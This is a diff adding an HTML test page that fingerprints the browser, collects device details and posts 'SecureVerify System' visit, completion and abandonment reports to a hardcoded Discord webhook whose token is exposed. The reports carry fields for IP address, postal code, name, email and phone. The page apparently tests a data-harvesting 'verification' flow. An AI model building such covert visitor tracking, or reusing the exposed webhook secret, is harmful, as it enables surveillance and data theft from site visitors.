@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enhanced Webhook Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .test-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .test-title {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .test-section {
+            margin-bottom: 25px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .test-section h3 {
+            color: #555;
+            margin-top: 0;
+        }
+        .user-id {
+            font-family: monospace;
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 3px;
+            word-break: break-all;
+        }
+        .button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .button:hover {
+            background: #0056b3;
+        }
+        .status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 3px;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="test-container">
+        <h1 class="test-title">Enhanced Webhook Test</h1>
+        
+        <div class="test-section">
+            <h3>🏷️ User Identification</h3>
+            <p><strong>Visit ID:</strong></p>
+            <div class="user-id" id="visit-id">Loading...</div>
+            <p><strong>Session ID:</strong></p>
+            <div class="user-id" id="session-id">Loading...</div>
+            <p><strong>Fingerprint:</strong></p>
+            <div class="user-id" id="fingerprint">Loading...</div>
+        </div>
+        
+        <div class="test-section">
+            <h3>🕐 Timestamp</h3>
+            <div class="user-id" id="timestamp">Loading...</div>
+        </div>
+        
+        <div class="test-section">
+            <h3>🧪 Test Webhooks</h3>
+            <button class="button" onclick="testInitialWebhook()">Test Initial Webhook</button>
+            <button class="button" onclick="testCompletionWebhook()">Test Completion Webhook</button>
+            <button class="button" onclick="testIncompleteWebhook()">Test Incomplete Webhook</button>
+            <div id="webhook-status"></div>
+        </div>
+        
+        <div class="test-section">
+            <h3>📱 Device Information</h3>
+            <div id="device-info">Loading...</div>
+        </div>
+    </div>
+
+    <script>
+        // Generate user identifiers
+        let userVisitId = 'USR-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 4).toUpperCase();
+        let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        let userFingerprint = generateUserFingerprint();
+        
+        // Display user identification
+        document.getElementById('visit-id').textContent = userVisitId;
+        document.getElementById('session-id').textContent = sessionId;
+        document.getElementById('fingerprint').textContent = userFingerprint;
+        
+        // Display timestamp
+        function formatTimestamp(date) {
+            return date.toLocaleString('en-US', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                timeZoneName: 'short'
+            });
+        }
+        document.getElementById('timestamp').textContent = formatTimestamp(new Date());
+        
+        // Generate user fingerprint
+        function generateUserFingerprint() {
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            
+            const data = `${userAgent}|${screenRes}|${timezone}|${language}|${platform}`;
+            let hash = 0;
+            for (let i = 0; i < data.length; i++) {
+                const char = data.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
+        }
+        
+        // Get device information
+        function getDeviceInfo() {
+            return {
+                mobileDeviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                platform: navigator.platform,
+                browser: navigator.userAgent.split(' ').find(word => word.includes('/'))?.split('/')[0] || 'Unknown',
+                os: navigator.userAgent.match(/(Windows|Mac|Linux|Android|iOS)/)?.[0] || 'Unknown',
+                language: navigator.language,
+                screenRes: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        // Display device information
+        const deviceInfo = getDeviceInfo();
+        document.getElementById('device-info').innerHTML = `
+            <strong>Device Type:</strong> ${deviceInfo.mobileDeviceType}<br>
+            <strong>Platform:</strong> ${deviceInfo.platform}<br>
+            <strong>Browser:</strong> ${deviceInfo.browser}<br>
+            <strong>OS:</strong> ${deviceInfo.os}<br>
+            <strong>Language:</strong> ${deviceInfo.language}<br>
+            <strong>Screen:</strong> ${deviceInfo.screenRes}<br>
+            <strong>Timezone:</strong> ${deviceInfo.timezone}
+        `;
+        
+        // Test webhook functions
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
+        
+        async function testInitialWebhook() {
+            const status = document.getElementById('webhook-status');
+            status.innerHTML = '<div class="status">Testing initial webhook...</div>';
+            
+            try {
+                const embed = {
+                    title: '🌐 **TEST: NEW USER VISIT DETECTED**',
+                    description: '👤 Test user accessing the verification system',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                        { name: '🕐 **TIMESTAMP**', value: `**Access Time:** ${formatTimestamp(new Date())}`, inline: false },
+                        { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`TEST-IP-123.45.67.89\`\n**Postal Code:** \`TEST-12345\``, inline: true },
+                        { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}`, inline: true }
+                    ],
+                    footer: {
+                        text: `🔐 SecureVerify System | User: ${userVisitId} | Test Mode`
+                    }
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                if (response.ok) {
+                    status.innerHTML = '<div class="status success">✅ Initial webhook test successful!</div>';
+                } else {
+                    status.innerHTML = '<div class="status error">❌ Initial webhook test failed</div>';
+                }
+            } catch (error) {
+                status.innerHTML = '<div class="status error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+        
+        async function testCompletionWebhook() {
+            const status = document.getElementById('webhook-status');
+            status.innerHTML = '<div class="status">Testing completion webhook...</div>';
+            
+            try {
+                const embed = {
+                    title: '✅ **TEST: USER VERIFICATION COMPLETED**',
+                    description: '👤 Test user completed verification process',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                        { name: '👤 **USER INFORMATION**', value: `**Full Name:** Test User\\n**Email:** test@example.com\\n**Phone:** +1-555-0123`, inline: false },
+                        { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`TEST-IP-123.45.67.89\`\n**Postal Code:** \`TEST-12345\``, inline: true },
+                        { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}`, inline: true }
+                    ],
+                    footer: {
+                        text: `🔐 SecureVerify System | User: ${userVisitId} | Test Completed`
+                    }
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                if (response.ok) {
+                    status.innerHTML = '<div class="status success">✅ Completion webhook test successful!</div>';
+                } else {
+                    status.innerHTML = '<div class="status error">❌ Completion webhook test failed</div>';
+                }
+            } catch (error) {
+                status.innerHTML = '<div class="status error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+        
+        async function testIncompleteWebhook() {
+            const status = document.getElementById('webhook-status');
+            status.innerHTML = '<div class="status">Testing incomplete webhook...</div>';
+            
+            try {
+                const embed = {
+                    title: '⚠️ **TEST: INCOMPLETE SESSION DETECTED**',
+                    description: '👤 Test user abandoned verification process',
+                    color: 0xff9500,
+                    fields: [
+                        { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
+                        { name: '🕐 **SESSION TIMELINE**', value: `**Started:** ${formatTimestamp(new Date())}\n**Status:** Abandoned`, inline: false },
+                        { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`TEST-IP-123.45.67.89\`\n**Postal Code:** \`TEST-12345\``, inline: true },
+                        { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}`, inline: true }
+                    ],
+                    footer: {
+                        text: `🔐 SecureVerify System | User: ${userVisitId} | Test Abandoned`
+                    }
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                if (response.ok) {
+                    status.innerHTML = '<div class="status success">✅ Incomplete webhook test successful!</div>';
+                } else {
+                    status.innerHTML = '<div class="status error">❌ Incomplete webhook test failed</div>';
+                }
+            } catch (error) {
+                status.innerHTML = '<div class="status error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+    </script>
+</body>
+</html>
